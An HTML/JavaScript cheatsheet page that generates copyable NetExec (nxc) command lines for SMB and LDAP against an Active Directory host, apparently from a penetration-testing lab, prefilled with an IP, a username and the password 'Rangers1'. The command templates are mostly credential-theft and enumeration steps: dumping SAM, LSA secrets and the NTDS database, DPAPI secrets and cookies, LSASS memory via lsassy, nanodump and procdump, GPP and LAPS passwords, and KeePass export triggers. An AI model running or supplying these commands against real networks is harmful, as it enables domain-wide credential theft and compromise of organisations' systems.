<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>nxc · SMB / LDAP cheatsheet</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: #0b1120;
      color: #e2e8f0;
      font-family: 'Segoe UI', 'Fira Code', monospace;
      height: 100vh;
      display: flex;
      flex-direction: column;
      overflow: hidden;
    }

    /* header */
    .header {
      background: #111b2e;
      padding: 0.7rem 2rem;
      border-bottom: 1px solid #1e2a41;
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      justify-content: space-between;
      gap: 0.8rem;
      flex-shrink: 0;
    }
    .header h1 {
      font-weight: 400;
      font-size: 1.3rem;
      display: flex;
      align-items: center;
      gap: 0.6rem;
      color: #b9c8e6;
    }
    .header h1 i {
      color: #5b8def;
    }
    .creds {
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      gap: 0.8rem;
      background: #0b1424;
      padding: 0.3rem 1rem;
      border-radius: 40px;
      border: 1px solid #1f314a;
    }
    .creds .cred-item {
      display: flex;
      align-items: center;
      gap: 0.3rem;
    }
    .creds label {
      font-size: 0.65rem;
      font-weight: 400;
      color: #7b93b5;
      letter-spacing: 0.3px;
    }
    .creds input,
    .creds select {
      background: #101b2b;
      border: 1px solid #253450;
      border-radius: 20px;
      padding: 0.15rem 0.6rem;
      color: #d6e2f5;
      font-size: 0.75rem;
      width: 110px;
      font-family: inherit;
      transition: 0.15s;
    }
    .creds input:focus,
    .creds select:focus {
      outline: none;
      border-color: #3b82f6;
      box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
    }
    .creds .hash-toggle {
      display: flex;
      align-items: center;
      gap: 0.3rem;
      background: #0f1a2b;
      padding: 0.05rem 0.5rem;
      border-radius: 40px;
      border: 1px solid #253450;
    }
    .creds .hash-toggle i {
      color: #5b7fa5;
      font-size: 0.65rem;
    }
    .creds .hash-toggle select {
      width: auto;
      background: transparent;
      border: none;
      padding: 0.05rem 0.1rem;
      color: #d6e2f5;
      font-size: 0.7rem;
      cursor: pointer;
    }

    /* main layout */
    .app {
      display: flex;
      flex: 1;
      overflow: hidden;
    }

    /* left panel: 4 main sections */
    .sidebar {
      width: 200px;
      background: #0d1628;
      border-right: 1px solid #1a2740;
      display: flex;
      flex-direction: column;
      padding: 1rem 0.6rem;
      overflow-y: auto;
      flex-shrink: 0;
    }
    .sidebar .group {
      margin-bottom: 1.6rem;
    }
    .sidebar .group h4 {
      font-size: 0.65rem;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      color: #5b7fa5;
      margin-bottom: 0.4rem;
      border-bottom: 1px solid #1a2740;
      padding-bottom: 0.25rem;
      display: flex;
      align-items: center;
      gap: 0.4rem;
    }
    .sidebar .group h4 i {
      color: #3b82f6;
      font-size: 0.7rem;
    }
    .sidebar .cmd-btn {
      display: block;
      width: 100%;
      text-align: left;
      background: transparent;
      border: none;
      padding: 0.35rem 0.6rem;
      margin: 0.1rem 0;
      border-radius: 6px;
      font-size: 0.75rem;
      font-weight: 450;
      color: #b0c6e5;
      cursor: pointer;
      transition: 0.1s;
      font-family: inherit;
      border-left: 2px solid transparent;
    }
    .sidebar .cmd-btn i {
      width: 18px;
      color: #506a8f;
      font-size: 0.7rem;
    }
    .sidebar .cmd-btn:hover {
      background: #14213a;
      color: #e2e8f0;
      border-left-color: #3b82f6;
    }
    .sidebar .cmd-btn.active {
      background: #1a2a48;
      color: #e2e8f0;
      border-left-color: #3b82f6;
      font-weight: 500;
    }
    .sidebar .group .cmd-btn .badge {
      float: right;
      font-size: 0.55rem;
      background: #1a2740;
      padding: 0 0.4rem;
      border-radius: 20px;
      color: #7b93b5;
    }

    /* right content — raw dark terminal */
    .content {
      flex: 1;
      background: #0b1120;
      padding: 1.5rem 2rem;
      overflow-y: auto;
      display: flex;
      flex-direction: column;
    }
    .content .cmd-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 1rem;
      flex-wrap: wrap;
      gap: 0.6rem;
    }
    .content .cmd-header h2 {
      font-weight: 400;
      font-size: 0.9rem;
      color: #b9c8e6;
      font-family: 'Fira Code', monospace;
      word-break: break-all;
      background: #0f1a2b;
      padding: 0.2rem 1rem;
      border-radius: 30px;
      border: 1px solid #1f314a;
    }
    .content .cmd-header .copy-all {
      background: #1a2a48;
      color: #b9c8e6;
      border: 1px solid #2a4060;
      padding: 0.2rem 1rem;
      border-radius: 30px;
      font-size: 0.65rem;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 0.4rem;
      transition: 0.1s;
      font-family: inherit;
    }
    .content .cmd-header .copy-all:hover {
      background: #253a5a;
      border-color: #3b82f6;
    }

    .terminal-box {
      background: #060d1a;
      border: 1px solid #1a2740;
      border-radius: 14px;
      padding: 1.2rem 1.8rem;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.6);
      flex: 1;
      display: flex;
      flex-direction: column;
    }
    .terminal-box pre {
      background: transparent;
      color: #d6e2f5;
      font-family: 'Fira Code', 'JetBrains Mono', monospace;
      font-size: 0.85rem;
      line-height: 1.7;
      white-space: pre-wrap;
      word-break: break-all;
      margin: 0;
      padding: 0.3rem 0;
      flex: 1;
    }
    .terminal-box .action-bar {
      display: flex;
      justify-content: flex-end;
      gap: 0.5rem;
      margin-top: 0.5rem;
      border-top: 1px solid #1a2740;
      padding-top: 0.6rem;
    }
    .terminal-box .action-bar button {
      background: transparent;
      border: 1px solid #2a4060;
      color: #8aa3c9;
      padding: 0.15rem 1rem;
      border-radius: 30px;
      font-size: 0.65rem;
      cursor: pointer;
      transition: 0.1s;
      font-family: inherit;
      display: flex;
      align-items: center;
      gap: 0.3rem;
    }
    .terminal-box .action-bar button:hover {
      background: #1a2a48;
      border-color: #3b82f6;
      color: #d6e2f5;
    }

    .toast {
      position: fixed;
      bottom: 2rem;
      right: 2rem;
      background: #14213a;
      color: #d6e2f5;
      padding: 0.5rem 1.6rem;
      border-radius: 40px;
      font-size: 0.8rem;
      border-left: 4px solid #3b82f6;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
      opacity: 0;
      transition: opacity 0.2s;
      pointer-events: none;
    }
    .toast.show {
      opacity: 1;
      pointer-events: auto;
    }

    .sidebar::-webkit-scrollbar {
      width: 3px;
    }
    .sidebar::-webkit-scrollbar-track {
      background: #0d1628;
    }
    .sidebar::-webkit-scrollbar-thumb {
      background: #253450;
      border-radius: 10px;
    }
    .content::-webkit-scrollbar {
      width: 3px;
    }
    .content::-webkit-scrollbar-track {
      background: #0b1120;
    }
    .content::-webkit-scrollbar-thumb {
      background: #1f314a;
      border-radius: 10px;
    }

    @media (max-width: 700px) {
      .sidebar {
        width: 160px;
        padding: 0.5rem;
      }
      .content {
        padding: 1rem;
      }
      .creds input {
        width: 80px;
      }
    }
  </style>
</head>
<body>
  <div class="header">
    <h1><i class="fas fa-terminal"></i> nxc · cheatsheet</h1>
    <div class="creds">
      <div class="cred-item"><label><i class="fas fa-network-wired"></i> IP</label><input id="ipInput" value="172.16.20.2" /></div>
      <div class="cred-item"><label><i class="fas fa-user"></i> User</label><input id="userInput" value="josh" /></div>
      <div class="cred-item"><label><i class="fas fa-key"></i> Pass</label><input id="passInput" value="Rangers1" /></div>
      <div class="cred-item"><label><i class="fas fa-hashtag"></i> Hash</label><input id="hashInput" placeholder="NTLM hash" /></div>
      <div class="hash-toggle"><i class="fas fa-exchange-alt"></i><select id="authMode"><option value="pass">password</option><option value="hash">hash</option></select></div>
    </div>
  </div>

  <div class="app">
    <!-- LEFT PANEL: exactly 4 main groups: SMB, SMB -k, LDAP, LDAP -k -->
    <div class="sidebar" id="sidebar">
      <div class="group">
        <h4><i class="fas fa-folder-open"></i> SMB</h4>
        <button class="cmd-btn active" data-target="smb"><i class="fas fa-share-alt"></i> smb</button>
        <button class="cmd-btn" data-target="smb-k"><i class="fas fa-key"></i> smb -k</button>
      </div>
      <div class="group">
        <h4><i class="fas fa-sitemap"></i> LDAP</h4>
        <button class="cmd-btn" data-target="ldap"><i class="fas fa-address-book"></i> ldap</button>
        <button class="cmd-btn" data-target="ldap-k"><i class="fas fa-key"></i> ldap -k</button>
      </div>
      <div style="margin-top: auto; padding-top: 0.8rem; border-top: 1px solid #1a2740; font-size: 0.6rem; color: #3a5078;">
        <i class="fas fa-info-circle"></i> click to load command
      </div>
    </div>

    <!-- RIGHT CONTENT: raw terminal -->
    <div class="content" id="contentArea">
      <div class="cmd-header">
        <h2 id="cmdTitle">nxc smb 172.16.20.2 -u josh -p 'Rangers1' --shares</h2>
        <button class="copy-all" id="copyFullCmd"><i class="far fa-copy"></i> copy</button>
      </div>
      <div class="terminal-box">
        <pre id="cmdPreview">nxc smb 172.16.20.2 -u josh -p 'Rangers1' --shares</pre>
        <div class="action-bar">
          <button id="copyCmdBtn"><i class="far fa-copy"></i> copy command</button>
        </div>
      </div>
    </div>
  </div>

  <div id="toast" class="toast"><i class="fas fa-check-circle" style="margin-right: 0.5rem; color: #4ade80;"></i> copied</div>

  <script>
    (function() {
      const ipInput = document.getElementById('ipInput');
      const userInput = document.getElementById('userInput');
      const passInput = document.getElementById('passInput');
      const hashInput = document.getElementById('hashInput');
      const authMode = document.getElementById('authMode');
      const cmdPreview = document.getElementById('cmdPreview');
      const cmdTitle = document.getElementById('cmdTitle');
      const copyFullBtn = document.getElementById('copyFullCmd');
      const copyCmdBtn = document.getElementById('copyCmdBtn');
      const toast = document.getElementById('toast');

      // ----- 4 main command templates (each holds the full command with placeholders) -----
      // We embed ALL commands per category as a multi-line string.
      const cmdMap = {
        'smb': {
          template: `nxc smb {ip} -u {user} {auth} --shares
        nxc smb {ip} -u {user} {auth} --users
        nxc smb {ip} -u {user} {auth} --local-groups
        nxc smb {ip} -u {user} {auth} --pass-pol
        nxc smb {ip} -u {user} {auth} --rid-brute 8000
        nxc smb {ip} -u {user} {auth} --reg-sessions
        nxc smb {ip} -u {user} {auth} --loggedon-users
        nxc smb {ip} -u {user} {auth} -M install_elevated
        nxc smb {ip} -u {user} {auth} -M keepass_discover
        nxc smb {ip} -u {user} {auth} -M uac
        nxc smb {ip} -u {user} {auth} -M wcc
        nxc smb {ip} -u {user} {auth} -M enum_cve
        nxc smb {ip} -u {user} {auth} --sam
        nxc smb {ip} -u {user} {auth} --sam regdump
        nxc smb {ip} -u {user} {auth} --sam secdump
        nxc smb {ip} -u {user} {auth} --lsa
        nxc smb {ip} -u {user} {auth} --lsa regdump
        nxc smb {ip} -u {user} {auth} --lsa secdump
        nxc smb {ip} -u {user} {auth} --ntds
        nxc smb {ip} -u {user} {auth} --ntds vss
        nxc smb {ip} -u {user} {auth} --ntds drsuapi
        nxc smb {ip} -u {user} {auth} --ntds --enabled
        nxc smb {ip} -u {user} {auth} --ntds --kerberos-keys
        nxc smb {ip} -u {user} {auth} --ntds --user Administrator
        nxc smb {ip} -u {user} {auth} --dpapi
        nxc smb {ip} -u {user} {auth} --dpapi cookies
        nxc smb {ip} -u {user} {auth} --dpapi nosystem
        nxc smb {ip} -u {user} {auth} -M dpapi_hash
        nxc smb {ip} -u {user} {auth} -M lsassy
        nxc smb {ip} -u {user} {auth} -M nanodump
        nxc smb {ip} -u {user} {auth} -M ntds-dump-raw
        nxc smb {ip} -u {user} {auth} -M ntdsutil
        nxc smb {ip} -u {user} {auth} -M powershell_history
        nxc smb {ip} -u {user} {auth} -M procdump
        nxc smb {ip} -u {user} {auth} -M reg-winlogon
        nxc smb {ip} -u {user} {auth} -M gpp_autologin
        nxc smb {ip} -u {user} {auth} -M gpp_password
        nxc smb {ip} -u {user} {auth} -M keepass_trigger -o ACTION=ALL`,
          desc: 'SMB · all commands'
        },
        'smb-k': {
          template: `nxc smb {ip} -u {user} {auth} -k --shares
        nxc smb {ip} -u {user} {auth} -k --users
        nxc smb {ip} -u {user} {auth} -k --local-groups
        nxc smb {ip} -u {user} {auth} -k --pass-pol
        nxc smb {ip} -u {user} {auth} -k --rid-brute 8000
        nxc smb {ip} -u {user} {auth} -k --reg-sessions
        nxc smb {ip} -u {user} {auth} -k --loggedon-users
        nxc smb {ip} -u {user} {auth} -k -M install_elevated
        nxc smb {ip} -u {user} {auth} -k -M keepass_discover
        nxc smb {ip} -u {user} {auth} -k -M uac
        nxc smb {ip} -u {user} {auth} -k -M wcc
        nxc smb {ip} -u {user} {auth} -k -M enum_cve
        nxc smb {ip} -u {user} {auth} -k --sam
        nxc smb {ip} -u {user} {auth} -k --sam regdump
        nxc smb {ip} -u {user} {auth} -k --sam secdump
        nxc smb {ip} -u {user} {auth} -k --lsa
        nxc smb {ip} -u {user} {auth} -k --lsa regdump
        nxc smb {ip} -u {user} {auth} -k --lsa secdump
        nxc smb {ip} -u {user} {auth} -k --ntds
        nxc smb {ip} -u {user} {auth} -k --ntds vss
        nxc smb {ip} -u {user} {auth} -k --ntds drsuapi
        nxc smb {ip} -u {user} {auth} -k --ntds --enabled
        nxc smb {ip} -u {user} {auth} -k --ntds --kerberos-keys
        nxc smb {ip} -u {user} {auth} -k --ntds --user Administrator
        nxc smb {ip} -u {user} {auth} -k --dpapi
        nxc smb {ip} -u {user} {auth} -k --dpapi cookies
        nxc smb {ip} -u {user} {auth} -k --dpapi nosystem
        nxc smb {ip} -u {user} {auth} -k -M dpapi_hash
        nxc smb {ip} -u {user} {auth} -k -M lsassy
        nxc smb {ip} -u {user} {auth} -k -M nanodump
        nxc smb {ip} -u {user} {auth} -k -M ntds-dump-raw
        nxc smb {ip} -u {user} {auth} -k -M ntdsutil
        nxc smb {ip} -u {user} {auth} -k -M powershell_history
        nxc smb {ip} -u {user} {auth} -k -M procdump
        nxc smb {ip} -u {user} {auth} -k -M reg-winlogon
        nxc smb {ip} -u {user} {auth} -k -M gpp_autologin
        nxc smb {ip} -u {user} {auth} -k -M gpp_password
        nxc smb {ip} -u {user} {auth} -k -M keepass_trigger -o ACTION=ALL`,
          desc: 'SMB -k · all commands'
        },
        'ldap': {
          template: `nxc ldap {ip} -u {user} {auth} --query "(objectClass=computer)" "cn,ms-MCS-AdmPwd,msLAPS-Password"
        nxc ldap {ip} -u {user} {auth} --query "(objectClass=organizationalUnit)" "cn,description"
        nxc ldap {ip} -u {user} {auth} --find-delegation
        nxc ldap {ip} -u {user} {auth} --trusted-for-delegation
        nxc ldap {ip} -u {user} {auth} --computers
        nxc ldap {ip} -u {user} {auth} --dc-list
        nxc ldap {ip} -u {user} {auth} --get-sid
        nxc ldap {ip} -u {user} {auth} --active-users
        nxc ldap {ip} -u {user} {auth} --pass-pol
        nxc ldap {ip} -u {user} {auth} -M adcs
        nxc ldap {ip} -u {user} {auth} -M certipy-find
        nxc ldap {ip} -u {user} {auth} -M badsuccessor
        nxc ldap {ip} -u {user} {auth} -M dump-computers
        nxc ldap {ip} -u {user} {auth} -M entra-id
        nxc ldap {ip} -u {user} {auth} -M get-network
        nxc ldap {ip} -u {user} {auth} -M get-scriptpath
        nxc ldap {ip} -u {user} {auth} -M maq
        nxc ldap {ip} -u {user} {auth} -M obsolete
        nxc ldap {ip} -u {user} {auth} -M sccm
        nxc ldap {ip} -u {user} {auth} -M subnets
        nxc ldap {ip} -u {user} {auth} -M whoami
        nxc ldap {ip} -u {user} {auth} -M get-desc-users
        nxc ldap {ip} -u {user} {auth} -M get-info-users
        nxc ldap {ip} -u {user} {auth} -M get-unixUserPassword
        nxc ldap {ip} -u {user} {auth} -M get-userPassword
        nxc ldap {ip} -u {user} {auth} -M laps
        nxc ldap {ip} -u {user} {auth} -M user-desc`,
          desc: 'LDAP · all commands'
        },
        'ldap-k': {
          template: `nxc ldap {ip} -u {user} {auth} -k --query "(objectClass=computer)" "cn,ms-MCS-AdmPwd,msLAPS-Password"
        nxc ldap {ip} -u {user} {auth} -k --query "(objectClass=organizationalUnit)" "cn,description"
        nxc ldap {ip} -u {user} {auth} -k --find-delegation
        nxc ldap {ip} -u {user} {auth} -k --trusted-for-delegation
        nxc ldap {ip} -u {user} {auth} -k --computers
        nxc ldap {ip} -u {user} {auth} -k --dc-list
        nxc ldap {ip} -u {user} {auth} -k --get-sid
        nxc ldap {ip} -u {user} {auth} -k --active-users
        nxc ldap {ip} -u {user} {auth} -k --pass-pol
        nxc ldap {ip} -u {user} {auth} -k -M adcs
        nxc ldap {ip} -u {user} {auth} -k -M certipy-find
        nxc ldap {ip} -u {user} {auth} -k -M badsuccessor
        nxc ldap {ip} -u {user} {auth} -k -M dump-computers
        nxc ldap {ip} -u {user} {auth} -k -M entra-id
        nxc ldap {ip} -u {user} {auth} -k -M get-network
        nxc ldap {ip} -u {user} {auth} -k -M get-scriptpath
        nxc ldap {ip} -u {user} {auth} -k -M maq
        nxc ldap {ip} -u {user} {auth} -k -M obsolete
        nxc ldap {ip} -u {user} {auth} -k -M sccm
        nxc ldap {ip} -u {user} {auth} -k -M subnets
        nxc ldap {ip} -u {user} {auth} -k -M whoami
        nxc ldap {ip} -u {user} {auth} -k -M get-desc-users
        nxc ldap {ip} -u {user} {auth} -k -M get-info-users
        nxc ldap {ip} -u {user} {auth} -k -M get-unixUserPassword
        nxc ldap {ip} -u {user} {auth} -k -M get-userPassword
        nxc ldap {ip} -u {user} {auth} -k -M laps
        nxc ldap {ip} -u {user} {auth} -k -M user-desc`,
          desc: 'LDAP -k · all commands'
        }
      };

      let currentKey = 'smb';

      function renderCommand(key) {
        const entry = cmdMap[key];
        if (!entry) return;
        const ip = ipInput.value.trim() || '172.16.20.2';
        const user = userInput.value.trim() || 'josh';
        const pass = passInput.value;
        const hash = hashInput.value.trim();
        const mode = authMode.value;

        let authPart = '';
        if (mode === 'pass' && pass) {
          authPart = `-p '${pass}'`;
        } else if (mode === 'hash' && hash) {
          authPart = `-H '${hash}'`;
        } else {
          authPart = pass ? `-p '${pass}'` : '';
        }

        let cmd = entry.template
          .replace(/\{ip\}/g, ip)
          .replace(/\{user\}/g, user)
          .replace(/\{auth\}/g, authPart);

        // clean up extra spaces & blank lines
        cmd = cmd.split('\n').map(line => line.trim()).filter(line => line.length > 0).join('\n');
        cmdPreview.textContent = cmd;
        cmdTitle.textContent = cmd.split('\n')[0] + (cmd.split('\n').length > 1 ? ' …' : '');

        // active button
        document.querySelectorAll('.cmd-btn').forEach(b => b.classList.remove('active'));
        const activeBtn = document.querySelector(`.cmd-btn[data-target="${key}"]`);
        if (activeBtn) activeBtn.classList.add('active');
      }

      function copyCurrentCmd() {
        const text = cmdPreview.textContent;
        if (navigator.clipboard) {
          navigator.clipboard.writeText(text).then(() => showToast('copied!'))
            .catch(() => fallbackCopy(text));
        } else {
          fallbackCopy(text);
        }
      }

      function fallbackCopy(text) {
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        ta.remove();
        showToast('copied!');
      }

      function showToast(msg) {
        toast.textContent = msg;
        toast.classList.add('show');
        setTimeout(() => toast.classList.remove('show'), 1800);
      }

      // left panel clicks
      document.querySelectorAll('.cmd-btn').forEach(btn => {
        btn.addEventListener('click', function(e) {
          const target = this.dataset.target;
          if (target && cmdMap[target]) {
            currentKey = target;
            renderCommand(target);
          }
        });
      });

      // inputs -> re-render
      [ipInput, userInput, passInput, hashInput, authMode].forEach(el => {
        el.addEventListener('input', () => renderCommand(currentKey));
        el.addEventListener('change', () => renderCommand(currentKey));
      });

      // copy buttons
      copyFullBtn.addEventListener('click', copyCurrentCmd);
      copyCmdBtn.addEventListener('click', copyCurrentCmd);

      // initial render
      renderCommand('smb');
    })();
  </script>
</body>
</html>
